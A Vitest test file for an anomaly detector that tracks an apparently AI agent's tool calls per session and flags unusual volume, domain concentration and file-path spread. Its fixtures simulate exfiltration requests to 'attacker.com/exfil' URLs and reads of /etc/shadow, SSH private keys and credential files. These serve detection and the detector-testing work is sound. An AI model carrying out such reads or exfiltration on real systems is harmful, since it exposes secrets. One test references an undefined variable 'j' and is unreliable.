/**
 * Tests for session-level behavioral baseline tracking.
 */

import { describe, expect, it, beforeEach } from "vitest";
import {
	createSessionBaselineTracker,
	type SessionBaselineConfig,
	type AnomalyResult,
} from "../session-baseline.js";

describe("SessionBaselineTracker", () => {
	let config: SessionBaselineConfig;

	beforeEach(() => {
		config = {
			enabled: true,
			windowSize: 10,
			checkInterval: 5,
			stdThreshold: 2.0,
			storagePath: "/tmp/test-session-baselines.json",
		};
	});

	describe("session tracking", () => {
		it("creates new session on first action", () => {
			const tracker = createSessionBaselineTracker(config);
			const session = tracker.recordAction("session-1", "Bash", { command: "ls -la" });

			expect(session.sessionId).toBe("session-1");
			expect(session.bashCommands).toBe(1);
			expect(session.actionCounts["Bash"]).toBe(1);
		});

		it("accumulates actions within a session", () => {
			const tracker = createSessionBaselineTracker(config);

			tracker.recordAction("session-1", "Bash", { command: "ls" });
			tracker.recordAction("session-1", "Bash", { command: "cd project" });
			tracker.recordAction("session-1", "Read", { file_path: "/etc/passwd" });
			tracker.recordAction("session-1", "Write", { file_path: "/tmp/test.txt", content: "hello" });

			const session = tracker.getOrCreateSession("session-1");
			expect(session.bashCommands).toBe(2);
			expect(session.fileReads).toBe(1);
			expect(session.fileWrites).toBe(1);
			expect(session.filePaths).toHaveLength(2);
		});

		it("tracks domain concentration from WebFetch", () => {
			const tracker = createSessionBaselineTracker(config);

			tracker.recordAction("session-1", "WebFetch", { url: "https://example.com/page1" });
			tracker.recordAction("session-1", "WebFetch", { url: "https://example.com/page2" });
			tracker.recordAction("session-1", "WebFetch", { url: "https://example.com/page3" });
			tracker.recordAction("session-1", "WebFetch", { url: "https://other.com/page" });

			const session = tracker.getOrCreateSession("session-1");
			expect(session.domains["example.com"]).toBe(3);
			expect(session.domains["other.com"]).toBe(1);
		});

		it("tracks curl requests from Bash commands", () => {
			const tracker = createSessionBaselineTracker(config);

			tracker.recordAction("session-1", "Bash", { command: "curl https://api.example.com" });
			tracker.recordAction("session-1", "Bash", { command: "wget https://files.example.com" });
			tracker.recordAction("session-1", "Bash", { command: "ls -la" });

			const session = tracker.getOrCreateSession("session-1");
			expect(session.curlRequests).toBe(2);
			expect(session.bashCommands).toBe(3);
		});
	});

	describe("baseline checking", () => {
		it("returns empty anomalies when no historical data exists", async () => {
			const tracker = createSessionBaselineTracker(config);
			
			// Simulate a session with high activity
			for (let i = 0; i < 50; i++) {
				tracker.recordAction("session-1", "Bash", { command: `command-${i}` });
			}

			const session = tracker.getOrCreateSession("session-1");
			const anomalies = await tracker.checkBaselines(session, "agent-1");

			// No anomalies because there's no baseline yet
			expect(anomalies).toHaveLength(0);
		});

		it("detects volume anomaly after baseline is established", async () => {
			const tracker = createSessionBaselineTracker(config);
			const agentId = "test-agent";

			// Establish baseline with normal sessions (5-10 bash commands each)
			for (let sessionNum = 0; sessionNum < 5; sessionNum++) {
				const sessionId = `baseline-session-${sessionNum}`;
				const bashCount = 5 + (sessionNum % 3); // 5, 6, 7, 5, 6

				for (let i = 0; i < bashCount; i++) {
					tracker.recordAction(sessionId, "Bash", { command: `cmd-${i}` });
				}

				const session = tracker.getOrCreateSession(sessionId);
				await tracker.checkBaselines(session, agentId);
			}

			// Now create an anomalous session with 80 bash commands
			for (let i = 0; i < 80; i++) {
				tracker.recordAction("anomalous-session", "Bash", { command: `cmd-${i}` });
			}

			const anomalousSession = tracker.getOrCreateSession("anomalous-session");
			const anomalies = await tracker.checkBaselines(anomalousSession, agentId);

			// Should detect volume anomaly
			const volumeAnomalies = anomalies.filter((a) => a.type === "volume");
			expect(volumeAnomalies).toHaveLength(1);
			expect(volumeAnomalies[0].currentValue).toBe(80);
			expect(volumeAnomalies[0].deviation).toBeGreaterThan(2.0);
		});

		it("detects domain concentration anomaly", async () => {
			const tracker = createSessionBaselineTracker(config);
			const agentId = "test-agent";

			// Establish baseline with normal domain distribution
			for (let sessionNum = 0; sessionNum < 5; sessionNum++) {
				const sessionId = `baseline-session-${sessionNum}`;
				
				// Each session hits 2-3 different domains, max 5 requests to any one
				for (let i = 0; i < 3; i++) {
					tracker.recordAction(sessionId, "WebFetch", { 
						url: `https://domain${i}.example.com/page${j || 0}` 
					});
				}

				const session = tracker.getOrCreateSession(sessionId);
				await tracker.checkBaselines(session, agentId);
			}

			// Anomalous session: 30 requests to same domain
			for (let i = 0; i < 30; i++) {
				tracker.recordAction("anomalous-session", "WebFetch", {
					url: `https://attacker.com/exfil${i}`,
				});
			}

			const anomalousSession = tracker.getOrCreateSession("anomalous-session");
			const anomalies = await tracker.checkBaselines(anomalousSession, agentId);

			const domainAnomalies = anomalies.filter((a) => a.type === "domain_concentration");
			expect(domainAnomalies.length).toBeGreaterThan(0);
			expect(domainAnomalies[0].currentValue).toBe(30);
		});

		it("detects file path radius expansion", async () => {
			const tracker = createSessionBaselineTracker(config);
			const agentId = "test-agent";

			// Establish baseline with shallow file access (1-2 levels deep)
			for (let sessionNum = 0; sessionNum < 5; sessionNum++) {
				const sessionId = `baseline-session-${sessionNum}`;
				
				tracker.recordAction(sessionId, "Read", { file_path: "/home/user/project/file.txt" });
				tracker.recordAction(sessionId, "Read", { file_path: "/home/user/config.json" });

				const session = tracker.getOrCreateSession(sessionId);
				await tracker.checkBaselines(session, agentId);
			}

			// Anomalous session: accessing deep system paths
			const deepPaths = [
				"/etc/passwd",
				"/etc/shadow",
				"/root/.ssh/id_rsa",
				"/var/lib/secret/credentials.json",
				"/usr/local/etc/app/secrets/api_key",
			];

			for (const path of deepPaths) {
				tracker.recordAction("anomalous-session", "Read", { file_path: path });
			}

			const anomalousSession = tracker.getOrCreateSession("anomalous-session");
			const anomalies = await tracker.checkBaselines(anomalousSession, agentId);

			const radiusAnomalies = anomalies.filter((a) => a.type === "file_radius");
			expect(radiusAnomalies.length).toBeGreaterThan(0);
		});

		it("respects stdThreshold configuration", async () => {
			const strictConfig = { ...config, stdThreshold: 3.0 };
			const tracker = createSessionBaselineTracker(strictConfig);
			const agentId = "test-agent";

			// Establish baseline
			for (let sessionNum = 0; sessionNum < 5; sessionNum++) {
				const sessionId = `baseline-session-${sessionNum}`;
				for (let i = 0; i < 10; i++) {
					tracker.recordAction(sessionId, "Bash", { command: `cmd-${i}` });
				}
				const session = tracker.getOrCreateSession(sessionId);
				await tracker.checkBaselines(session, agentId);
			}

			// Moderately anomalous session (25 commands)
			for (let i = 0; i < 25; i++) {
				tracker.recordAction("test-session", "Bash", { command: `cmd-${i}` });
			}

			const session = tracker.getOrCreateSession("test-session");
			const anomalies = await tracker.checkBaselines(session, agentId);

			// With threshold 3.0, this might not trigger
			const volumeAnomalies = anomalies.filter((a) => a.type === "volume");
			// Either 0 or 1 depending on exact deviation
			expect(volumeAnomalies.length).toBeLessThanOrEqual(1);
		});
	});

	describe("utility functions", () => {
		it("extracts domain from URL correctly", () => {
			const tracker = createSessionBaselineTracker(config);
			
			// This is tested indirectly through domain tracking
			tracker.recordAction("session-1", "WebFetch", { url: "https://sub.example.com/path" });
			const session = tracker.getOrCreateSession("session-1");
			expect(session.domains["sub.example.com"]).toBe(1);
		});

		it("handles session cleanup", () => {
			const tracker = createSessionBaselineTracker(config);
			
			tracker.recordAction("old-session", "Bash", { command: "ls" });
			tracker.recordAction("new-session", "Bash", { command: "ls" });

			// Manually age the old session
			const oldSession = tracker.getOrCreateSession("old-session");
			oldSession.lastActivity = Date.now() - 7200000; // 2 hours ago

			const expired = tracker.cleanupExpiredSessions(3600000);
			expect(expired).toBe(1);
			expect(tracker.getOrCreateSession("old-session")).not.toBe(oldSession);
		});

		it("shouldCheckBaselines respects checkInterval", () => {
			const config5 = { ...config, checkInterval: 5 };
			const tracker = createSessionBaselineTracker(config5);

			expect(tracker.shouldCheckBaselines(1)).toBe(false);
			expect(tracker.shouldCheckBaselines(4)).toBe(false);
			expect(tracker.shouldCheckBaselines(5)).toBe(true);
			expect(tracker.shouldCheckBaselines(10)).toBe(true);
		});
	});

	describe("severity classification", () => {
		it("marks deviation > 3σ as critical", async () => {
			const tracker = createSessionBaselineTracker(config);
			const agentId = "test-agent";

			// Establish very tight baseline
			for (let sessionNum = 0; sessionNum < 10; sessionNum++) {
				const sessionId = `baseline-session-${sessionNum}`;
				for (let i = 0; i < 10; i++) {
					tracker.recordAction(sessionId, "Bash", { command: `cmd-${i}` });
				}
				const session = tracker.getOrCreateSession(sessionId);
				await tracker.checkBaselines(session, agentId);
			}

			// Extremely anomalous session (100 commands - should be > 3σ)
			for (let i = 0; i < 100; i++) {
				tracker.recordAction("extreme-session", "Bash", { command: `cmd-${i}` });
			}

			const session = tracker.getOrCreateSession("extreme-session");
			const anomalies = await tracker.checkBaselines(session, agentId);

			const volumeAnomalies = anomalies.filter((a) => a.type === "volume");
			if (volumeAnomalies.length > 0) {
				expect(volumeAnomalies[0].severity).toBe("critical");
			}
		});
	});
});

describe("SessionBaselineTracker disabled config", () => {
	it("returns empty anomalies when disabled", async () => {
		const config = {
			enabled: false,
			windowSize: 10,
			checkInterval: 5,
			stdThreshold: 2.0,
			storagePath: "/tmp/test-session-baselines.json",
		};

		const tracker = createSessionBaselineTracker(config);
		
		for (let i = 0; i < 50; i++) {
			tracker.recordAction("session-1", "Bash", { command: `cmd-${i}` });
		}

		const session = tracker.getOrCreateSession("session-1");
		const anomalies = await tracker.checkBaselines(session, "agent-1");

		expect(anomalies).toHaveLength(0);
	});
});
